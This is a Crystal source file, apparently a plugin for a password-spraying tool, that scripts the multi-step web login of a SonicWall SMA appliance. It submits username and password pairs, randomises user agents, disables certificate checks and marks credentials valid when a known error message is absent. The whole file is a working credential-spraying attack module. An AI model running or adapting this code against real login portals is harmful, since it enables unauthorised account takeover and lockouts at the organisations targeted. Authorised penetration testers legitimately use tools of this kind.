require "http/client"

class Sonicwall_SMA <  Sprayer

    ## only uncomment if needed
    # def initialize(usernames : Array(String), password : Array(String))
    #     # init any special or default variables here
    #     super()
    # end

    # returns an array of [username, password, valid, lockout, mfa]
    def spray(username : String, password : String) : SprayStatus
        spstatus = SprayStatus.new()
        spstatus.username = username 
        spstatus.password = password 

        # 
        # YOUR CODE BELOW 
        #

        # some basic setups for web based auth 
        url = URI.parse @target 
        #gotta set no verify for tls pages
        context = OpenSSL::SSL::Context::Client.new
        context.verify_mode = OpenSSL::SSL::VerifyMode::NONE
        # create a http client 
        client = HTTP::Client.new(url, tls: context)
        # and some basic header options
        header = HTTP::Headers{ # basic template for headers for post/get request 
            "User-Agent" => @useragents[rand(0..(@useragents.size - 1))], # uses a random header theres only 1 by default 
            "Accept" => "*/*",
            "Cookie" => "EPC_MI=%26activeX%3A0%26win%3A1%26win32%3A1%26win64%3A1%26x64%3A1%26platform%3AWindows%26winnt%3A1%26win10%3A1%26moz%3A109.0%26fx%3A109.0%26browser%3ANetscape%26browserVersion%3A109.0%26jsVersion%3A1.5%26height%3A1080%26width%3A1920%26userAgent%3Amozilla%252F5.0%2520(windows%2520nt%252010.0%253B%2520win64%253B%2520x64%253B%2520rv%253A109.0)%2520gecko%252F20100101%2520firefox%252F110.0%26userLocale%3Aen-US",
            "Accept-Language" => "en-US,en;q=0.5",
            "Accept-Encoding" => "gzip, deflate",
            "Content-Type" => "application/x-www-form-urlencoded",
            "Origin" => "https://#{url.host}"
        } 

        form = "realmID=144&realmButton=+Next+%3E+&alias=workplace&resource=%2Fworkplace%2Faccess%2Fhome" # request form params here
        

        # Make the basic request for the "id" in the first web request
        # puts "making first request".colorize(:red)
        page = client.post("/__extraweb__realmselect", headers: header, form: form) # client supporst all http verbs as client.verb -> client.get, client.delete..etc 
        token_id = URI.parse(page.headers["Location"]).as(URI).query_params["id"]
        cookies = HTTP::Cookies.from_server_headers page.headers
        extraweb_state = cookies["EXTRAWEB_STATE"]
        # pp page 

        

        ## now make the "authorize" check button 
        form = "acceptButton=+Accept+&id=#{ URI.encode_www_form token_id }&alias=workplace&resource=%252Fworkplace%252Faccess%252Fhome&method=forms&realm=144"
        header["EXTRAWEB_REFERER"] = "%252Fworkplace%252Faccess%252Fhome"
        # puts "Requesting mid page".colorize(:red)
        page = client.post("/__extraweb__authen", headers: header, form: form) 
        # pp page 
        # for some reason you have to request this one twice.... i think its due to needing the "id" token to be used before it allows to be submitted for authentication
        # puts "Requesting mid page #2".colorize(:red)
        page = client.post("/__extraweb__authen", headers: header, form: form) 
        # pp page 

        # now we handle the actual sign in request! :) 
        form = "data_0=#{URI.encode_www_form  username }&data_1=#{ URI.encode_www_form password }&okButton=+Log+in+&id=#{ URI.encode_www_form token_id }&alias=workplace&resource=%252Fworkplace%252Faccess%252Fhome&method=forms&realm=144"
        header["EXTRAWEB_REFERER"] = "%252F__extraweb__authen"
        header["Referer"] = "https://#{url.host}/__extraweb__authen"
        # puts "Making final auth login request".colorize(:red)
        page = client.post("/__extraweb__authen", headers: header, form: form)
        # pp page

        #
        # logic for if valid login goes here replace whats here. it only serves as a guide for quick editing 
        
        if page.body.includes? "The credentials provided were invalid"
        else 
            spstatus.valid_credentials = true 
        end

        
        #
        # end of your CODE make sure you set valid lockedout and mfa 
        # 
        
        # return the SprayStatus object 
        return spstatus
    end
end